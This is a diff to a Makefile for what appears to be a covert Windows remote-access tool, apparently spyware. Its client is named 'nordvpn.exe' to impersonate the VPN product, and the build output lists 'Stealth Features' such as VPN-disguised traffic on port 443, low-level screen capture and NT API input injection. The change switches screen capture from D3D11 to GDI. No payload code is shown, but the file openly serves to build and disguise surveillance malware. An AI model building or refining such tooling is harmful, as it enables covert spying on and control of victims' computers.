@@ -12,7 +12,7 @@ CLIENT_EXE = nordvpn.exe
 SERVER_EXE = server.exe
 
 # Windows libraries
-CLIENT_LIBS = -lws2_32 -ld3d11 -ldxgi -lntdll -lgdi32 -luser32 -static
+CLIENT_LIBS = -lws2_32 -lntdll -lgdi32 -luser32 -static
 SERVER_LIBS = -luser32 -lgdi32 -lcomctl32 -lws2_32 -static
 
 # Source files
@@ -74,7 +74,7 @@ test-build: all
 	@echo "🛡️ Stealth Features:"
 	@echo "  • VPN-disguised traffic (port 443)"
 	@echo "  • Process name: nordvpn.exe"
-	@echo "  • Low-level screen capture (D3D11)"
+	@echo "  • Low-level screen capture (GDI)"
 	@echo "  • NT API input injection"
 	@echo ""
 
